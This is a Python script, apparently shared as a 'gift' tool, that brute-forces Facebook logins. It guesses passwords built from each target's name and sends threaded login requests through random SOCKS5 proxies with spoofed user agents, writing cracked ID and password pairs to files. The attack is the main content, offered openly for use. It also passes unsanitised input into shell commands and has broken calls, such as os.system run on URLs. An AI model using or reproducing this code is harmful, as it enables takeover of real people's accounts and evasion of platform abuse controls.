#!/usr/bin/python3
# -*- coding: utf-8 -*-
# EID GIFT BY YAMAN
try:
	import os,requests,json,time,re,random,sys
	from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError: 
	print('\n Installing missing modules ...')
	os.system('pip install requests futures==2 > /dev/null')
	os.system('python YAMAN.py')
ses = requests.Session()
oks=[]
cps=[]
pcp=[]
loop=0

###---[ APPEND ]---###
dump, sandi, metode = [], [], []
tetel, opsi, proxy = [], [], []
cepeh, sam, ugen2, ugen, ugen5, redmi = [], [], [], [], [], []
id, id2, loop ,ok , cp = [], [], 0, 0, 0
os.system("https://www.facebook.com/profile.php?id=100093025707464")
logo=("""\033[1;37m 

                                
     /\                          
    /  \   _ __ ___   __ _ _ __  
   / /\ \ | '_ ` _ \ / _` | '_ \ 
  / ____ \| | | | | | (_| | | | |
 /_/    \_\_| |_| |_|\__,_|_| |_|
                                                                                                                                                             
\033[47m\033[1;31m YxB GIFT  \033[41m\033[1;37m FOR HERO-HONI 2.o \x1b[0m
\033[1;37m----------------------------------------------
 Author    : YAxMAN
 Facebook  : YAMAN-XWD
 Tool Name : YAMAN
 Version   : 2.o
\033[1;37m----------------------------------------------

\033[1;37m----------------------------------------------""")

def YM():
    
    os.system('clear')
    print(logo)
    print('\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] STATUS   :\x1b[1;92mPAID\x1b[1;97m');time.sleep(0.03)
    print('\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] VERSION  :\x1b[1;92m2.o\x1b[1;97m  ')         
    print(47*'-')
    print('[01] Crack File')
    print('[02] Contact Admin')
    print(47*'-')
    
    _YM___ = input('\x1b[1;92m[<\>\x1b[1;92m] CHOOSE OPTION : ')
    if _YM___ in ('1', '01'):
        file()
    if _YM___ in ('2', '02'):
    	mysocial()
    if _YM___ in ('B', 'b'):
       create_file_login()
    if _YM___ in ('3', '03'):
       dubal()
    if _YM___ in ('4', '04'):
       slicer()
    if _YM___ in ('5', '05'):
       separate()
    if _YM___ in ('6', '06'):
        count()
    if _YM___ in ('7', '07'):
        merg()
    if _YM___ in ('8', '08'):
    	login()
    if _YM___ in ('9', '09'):
    	removeu()
def linex():
	print('\033[1;37m----------------------------------------------')
def clear():
	os.system('clear')
	print(logo)
try:
	clear()
	print(f'\r\nEnjoy Free Tool')
	try:os.remove('.proxy.txt')
	except:pass
	A = ''
	one = ses.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt').text
	for x in one.splitlines():
		if '+' in x:
			if '.' in x:
				p = x.split(' ')[0]
				A += '\n'+p
	uno = ses.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt").text
	open('.proxy.txt','w').write(uno)
except requests.exceptions.ConnectionError:
	sys.exit(" No internet connection")
fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
#tan=('https')
#iya=('github')
#ani=('Fariya')
#love=('mbasic')
ugen=[]
ugen=[]
useragent=[]
for xd in range(10000):
        aa='Mozilla/5.0 (Linux; U; Android'
        b=random.choice(['6','7','8','9','10','11','12','13'])
        c=f' TL-tl; {str(gt)}'
        g='AppleWebKit/537.36 (KHTML, lYxBe Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, lYxBe Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
for x in range(10000):
	aa='Mozilla/5.0 (Windows NT 6.1; WOW64)'
	b=random.choice(['4','5','6','7','8','9','10','11','12'])
	c='ASUS_I006D Build/RKQ1.201022.002'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.3'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 Sleipnir/3.5.28'
	uakua=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	useragent.append(uakua)
    
def file():
				clear()
				print(' Put file example:  /sdcard/File.txt  etc..')
				linex()
				file = input(' Put file path\033[1;37m: ')
				try:
					fo = open(file,'r').read().splitlines()
				except FileNotFoundError:
					print(' File location not found ')
					time.sleep(1)
					menu()
				clear()
				plist = []
				print(' Select Password Crack menu');linex();print(' [1] Crack with auto password \n [2] Crack with choice password');linex()
				ppp=input(' Choose: ')
				if ppp in ['1','01']:
					plist.append('first last')
					plist.append('firstkhan')
					plist.append('lastkhan')
					plist.append('last1122')
					plist.append('firstlast')
					plist.append('first786')
				else:
					try:
						linex()
						ps_limit = int(input(' How many passwords do you want to add ? '))
					except:
						ps_limit =1
					linex()
					print('\033[1;32m exp: first last,firtslast,first123')
					linex()
					for i in range(ps_limit):
						plist.append(input(f' Put password {i+1}: '))
				linex()
				print(' Do you went show cp account? (y/n): ')
				linex()
				cx=input(' Choose: ')
				if cx in ['y','Y','yes','Yes','1']:
					pcp.append('y')
				else:
					pcp.append('n')
				with tred(max_workers=30) as crack_submit:
					clear()
					total_ids = str(len(fo))
					print(' Total Ids in File : \033[1;32m'+total_ids+f' ')
					print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
					linex()
					for user in fo:
						ids,names = user.split('|')
						passlist = plist
						crack_submit.submit(api,ids,names,passlist)
				print('\033[1;37m')
				linex()
				print(' The process has completed')
				print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
				linex()
				input(' Press enter to back ')
def api(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [CRACKING] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fYxBr in passlist:
                        pas = fYxBr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        ua=random.choice(ugen)
                        xx = open('.proxy.txt','r').read().splitlines()
                        proxy = {'http': 'socks5://'+random.choice(xx)}
                        head = {"Host": "m.facebook.com",
    "viewport-width": "980",
    "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"",
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": "\"Android\"",
    "sec-ch-prefers-color-scheme": "light",
    "dnt": "1",
    "upgrade-insecure-requests": "1",
    "user-agent": ua,
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-user': '?1',
    'sec-fetch-dest': 'document',
    "accept-encoding": "gzip, deflate, br",
    'accept-language': 'en-US,en;q=0.9',}
                        getlog = session.get(f'https://m.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        YxB =session.cookies.get_dict().keys()
                        if "c_user" in YxB:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [SUCCESFUL] %s | %s'%(ids,pas))
                                open('/sdcard/YAMAN-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in YxB:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/YAMAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
	
def removeu():
        os.system('rm token.txt cookie.txt');exit('\n\x1b[92m [✓] Logout Successfully')
        login()
        
def count():
    os.system("clear")
    print (logo)
    file_x = input(" [<\>] Put file path :")
    file = open(file_x, "r")
    line_count = 0
    for line in file:
        if line != "\n":
            line_count += 1
    file.close()
    total = str(line_count)
    print(" [<\<] Total Line number : "+total)
    input(" [<\>] Exit :)")
    YM()
    
def merg():
    os.system("clear")
    print (logo)
    f1 = input(" [<\>] Put 1st file Path : ")
    f2 = input(" [<\>] Put 2nd file Path : ")
    output_file = input(" [+] Put output all save file Path : ")
    data = data2 = ""
    with open(f1) as fp:
        data = fp.read()
    with open(f2) as fp:
        data2 = fp.read()
    data += "\n"
    data += data2
    with open (output_file, 'w') as fp:
        fp.write(data)
    print(" [<\>] File merging Complete save in "+output_file)
    YM()
    
def dubal():
    os.system('clear')
    print(logo)
    print(" Enter File Path / File Location \n")
    YAMAN = input(' Put File Name :')
    print(" ")
    YxB = input(' Saving Put File Name : ')
    os.system('touch ' +YxB)
    os.system('sort -r '+YAMAN+' | uniq > '+YxB)
    os.system('clear')
    print(logo)
    print(" Removed Successful From File: " + YAMAN )
    print(" New File Saved:" + YxB )
    print(47*'-')
    YM()
def mysocial():
	os.system("https://www.facebook.com/profile.php?id=100081701379811")
	YM()
import os
import re
def slicer():
    os.system("clear")
    print (logo)
    filex = input(" [<\>] Put File Path : ")
    with open(filex, 'r+') as fp:
        s = int(input(' [+] Put  line number : '))
        lines = fp.readlines()
        fp.seek(0)
        fp.truncate()
        fp.writelines(lines[s:])
        print(" [+] Line Slice Compelte back :)")
        YM()
        
def separate():
    os.system('clear')
    print (logo)
    print ('\033[1;37mSeparate Links From File\033[0;97m')
    print (47*'-')
    file_name = input('\033[1;37mInput file name: ')
    print(47*'-')
    if file_name == '':
        main_menu()
    print ('\033[1;32mFor Example /sdcard/YAMAN.txt\033[0;97m')
    print (47*'-')
    new_save = input('\033[1;37mSave New file Name: \033[0;97m')
    if "/sdcard/" not in new_save:
        print ('Put /sdcard/yourfile name.txt')
        time.sleep(2)
        separate()
    elif new_save == '':
        main_menu()
    try:
        limit = int(input('\033[1;32mHow many links do you want to separate? \033[0;97m'))
    except:
        limit = 1
    y = 0
    for y in range(limit):
        y+=1
        links = input('\033[0;97mSelect link %s: '%(y))
        os.system('cat '+file_name+' | grep '+links+' >> '+new_save)
    print(47*'-')
    print('\033[1;37mLinks Separate successfully')
    print('\033[1;32mNew file saved as: /sdcard/'+new_save)
    print(47*'-')
    input('\033[1;32mPress enter to back ')
    YM()
    
YM()
